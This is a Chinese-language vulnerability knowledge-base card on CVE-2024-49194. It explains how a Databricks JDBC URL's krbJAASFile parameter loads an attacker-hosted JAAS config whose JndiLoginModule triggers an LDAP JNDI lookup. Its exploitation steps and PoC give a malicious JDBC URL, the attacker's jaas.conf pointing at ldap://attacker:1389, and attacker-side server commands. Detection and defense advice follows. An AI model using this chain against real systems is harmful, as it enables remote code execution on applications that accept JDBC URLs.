---
id: web-java-deserialization-jndi-databricks-jdbc-krbjaasfile-jndi
title: Databricks JDBC 驱动 krbJAASFile 远程 JAAS 配置注入：JndiLoginModule 触发二次 JNDI lookup（CVE-2024-49194）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: databricks-jdbc-krbjaasfile-jndi
tags:
- java
- jdbc
- databricks
- jndi
- jaas
- jndi-login-module
- cve-2024-49194
- ssrf
- rce
cve:
- CVE-2024-49194
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:45:47+08:00'
  notes: 已对照原文与截图核对：HiveJDBCCommonConnection.establishConnection 取 krbJAASFile 写入 m_krbJaasConfigFile（图18），transportMode=HTTP 分支创建 HTTP transport，Kerberos.getSubjectViaJAASConfig 在系统属性/环境变量未设时 System.setProperty(java.security.auth.login.config, 攻击者URL)（图21），ConfigFile.init 用 new URL(extra_config) 读取远程 jaas.conf（图23-24），parseLoginEntry 解析 JndiLoginModule+user.provider.url（图25-26），LoginContext.invoke→JndiLoginModule.login→attemptAuthentication→lookup(userProvider) 触发二次 JNDI（图27-29），与卡一致；CVE-2024-49194 标注正确。核对修正：卡内 affected_versions 仅写“databricks-jdbc 2.6.38（原文调试/利用版本；未给区间）”，属目标/调试版本，已 --clear。未验证点：未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-databricks-jdbc-krbjaasfile-jndi/
draft: false
kb_aliases:
- CVE-2024-49194
- Databricks JDBC JNDI
- krbJAASFile
- JAAS 配置注入
- JndiLoginModule JNDI
- jdbc:databricks
- HiveJDBC krbJAASFile
---

## 一句话结论

Databricks JDBC 驱动会把 JDBC URL 中的 `krbJAASFile` 原样写入 `java.security.auth.login.config` 并由 `LoginContext` 加载；攻击者把它指向自己 HTTP 服务上的 JAAS 配置，让配置中的 `com.sun.security.auth.module.JndiLoginModule` 带着 `user.provider.url="ldap://attacker/..."` 执行登录，最终在 `JndiLoginModule.attemptAuthentication` 里触发二次 JNDI lookup（CVE-2024-49194）。

## 原理

- 入口是 JDBC URL：
  ```text
  jdbc:databricks://localhost:443/default;transportMode=http;ssl=1;
  httpPath=/sql/1.0/endpoints/12345;AuthMech=1;krbHostFQDN=localhost;
  krbServiceName=spark;krbJAASFile=http://attacker:8888/jaas.conf
  ```
- 驱动 `HiveJDBCCommonConnection.establishConnection` 读取 `krbJAASFile`：`getOptionalSetting("krbJAASFile", settings)` → `m_definedSettings.put("krbJAASFile", true)` → `m_settings.m_krbJaasConfigFile = var7.getString()`。该值没有 scheme/主机白名单校验。
- 当 `transportMode=http` 时，`HiveServer2ClientFactory.createTransport` 不走普通 socket 分支，进入 HTTP 客户端创建；随后 `Kerberos.getSubjectViaJAASConfig` 执行 `System.setProperty("java.security.auth.login.config", 攻击者URL)`（若系统属性/环境变量未预先设置）。
- `LoginContext` 加载 JAAS 配置时，`javax.security.auth.login.Configuration.getConfiguration()` 从 `login.configuration.provider` 取实现类，默认 `sun.security.provider.ConfigFile`；`ConfigFile.init` 读取系统属性 `java.security.auth.login.config`，用 `new URL(extra_config)` 打开远程输入流并 `readConfig` 解析。
- 攻击者的 `jaas.conf` 内容：
  ```text
  Client {
     com.sun.security.auth.module.JndiLoginModule required
     user.provider.url="ldap://attacker:1389/test"
     group.provider.url="test"
     tryFirstPass="true";
  };
  ```
  `parseLoginEntry` 解析出模块类名与 options（`user.provider.url` 等），`LoginContext.invoke("login")` 反射调用 `JndiLoginModule.login()`。
- `JndiLoginModule.login()` 在 `tryFirstPass=true` 时调用 `attemptAuthentication(true)`；该方法执行：
  ```java
  InitialContext iCtx = new InitialContext();
  ctx = (DirContext) iCtx.lookup(userProvider);   // 攻击者可控 LDAP URL
  ...
  ctx.search("", "(uid=" + username + ")", controls);
  ```
  这里的 `iCtx.lookup(userProvider)` 就是二次 JNDI 注入点；后续 `search` 还可用于触发返回代理对象的方法调用（见关联卡片）。
- 根因：JDBC 驱动把连接串中的“配置文件路径/URL”当成可信配置交给 JAAS；JAAS 配置本身支持 `JndiLoginModule`，其 `user.provider.url` 又会发起 JNDI lookup。三层信任传递之间没有来源校验，导致一条 JDBC URL 即可打通到 JNDI 注入。

## 触发条件

- 应用允许攻击者控制 JDBC URL（数据源测试连接、后台配置、或上游 JNDI 本地工厂构造的 DataSource，如 ViburDBCP）；
- classpath 含受影响版本的 Databricks JDBC 驱动（原文使用 2.6.38），且 URL 能选中该驱动（`jdbc:databricks://`）；
- JDBC URL 设置 `AuthMech=1`、`transportMode=http`、`krbJAASFile=<攻击者URL>`，使驱动走到 Kerberos/JAAS 分支；
- 目标可出网访问攻击者 HTTP（取 jaas.conf）与 LDAP（二次 lookup）；
- 目标 JDK 含 `com.sun.security.auth.module.JndiLoginModule`（标准 JDK 自带）。

## 利用步骤

1. 确认目标使用 Databricks JDBC 驱动且 JDBC URL 可控。
2. 在攻击者 HTTP 服务放 `jaas.conf`，配置 `JndiLoginModule`，`user.provider.url` 指向攻击者 LDAP。
3. 构造 JDBC URL，设置 `transportMode=http;ssl=1;AuthMech=1;krbHostFQDN=localhost;krbServiceName=spark;krbJAASFile=http://attacker:8888/jaas.conf`。
4. 触发 `DriverManager.getConnection(jdbcUrl)`（或经 JNDI 本地工厂构造 DataSource 后 `start()`）。
5. 驱动下载并解析 jaas.conf，`JndiLoginModule` 发起 `InitialContext.lookup("ldap://attacker:1389/...")`。
6. 攻击者 LDAP 返回恶意 Reference，进入下一段利用（本地对象工厂/Hessian/反序列化等）。

## PoC

```java
String jdbcUrl =
    "jdbc:databricks://localhost:443/default;transportMode=http;\n" +
    "ssl=1;httpPath=/sql/1.0/endpoints/12345;\n" +
    "AuthMech=1;krbHostFQDN=localhost;\n" +
    "krbServiceName=spark;krbJAASFile=http://127.0.0.1:8888/jaas.conf";
DriverManager.getConnection(jdbcUrl);
```

```text
# jaas.conf（攻击者 HTTP 服务返回）
Client {
   com.sun.security.auth.module.JndiLoginModule required
   user.provider.url="ldap://attacker:1389/test"
   group.provider.url="test"
   tryFirstPass="true";
};
```

```bash
# 攻击者侧
python3 -m http.server 8888     # 提供 jaas.conf
# 另起 LDAP 服务（原文用 JNDIMap）返回下一段 Reference
```

关键调用链（原文调试）：

```text
Kerberos.getSubjectViaJAASConfig
  -> System.setProperty("java.security.auth.login.config", "http://attacker:8888/jaas.conf")
  -> sun.security.provider.ConfigFile.init(URL) / readConfig(InputStream)
  -> parseLoginEntry -> JndiLoginModule
  -> JndiLoginModule.login -> attemptAuthentication
  -> InitialContext.lookup("ldap://attacker:1389/test")
```

## 变体与关联

- `krbJAASFile` 也可指向本地文件（`file:///...`）或 `data:` 等可读来源；远程 HTTP 只是原文验证的一种。
- 同类“JDBC URL 参数即配置/URL”的驱动问题很多：MySQL `autoDeserialize`、H2 `INIT`、PostgreSQL `socketFactory`、各类 Kerberos/JAAS 配置参数；审计时应把所有 URL 参数当作攻击面。
- 关联 [[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]：原文用 JNDI 本地工厂构造 DataSource，从而把攻击者 JDBC URL 送入本驱动。
- 关联 [[web-java-deser-hessian-proxyfactory-jndi-deserialization]] 与 [[web-java-deser-hessian-jndi-reference-only-unixprintservice]]：本卡触发的二次 JNDI lookup 在原文中由 Hessian 链承接。
- 边界：Databricks 驱动不在 classpath、URL 不可控、或目标不能出网时链断；原文未给出受影响版本区间，2.6.38 仅为调试版本。

## 检测与防御

- 不允许外部输入直接作为 JDBC URL；数据源测试连接接口必须鉴权，并对 URL 的 scheme、主机、参数做白名单。
- 禁止 JDBC URL 中出现 `krbJAASFile` 指向远程地址；对驱动 URL 参数做键名白名单。
- 限制应用服务器出站 HTTP/LDAP，阻断 jaas.conf 下载与二次 lookup。
- 升级 Databricks JDBC 驱动到厂商修复版本（原文未标注修复版本，需按官方公告核对）。
- 监控：`java.security.auth.login.config` 被设置为远程 URL、`JndiLoginModule` 出现在 JAAS 配置中、JDBC 连接建立时对非常规主机的访问、驱动进程随后发起的 LDAP 请求。
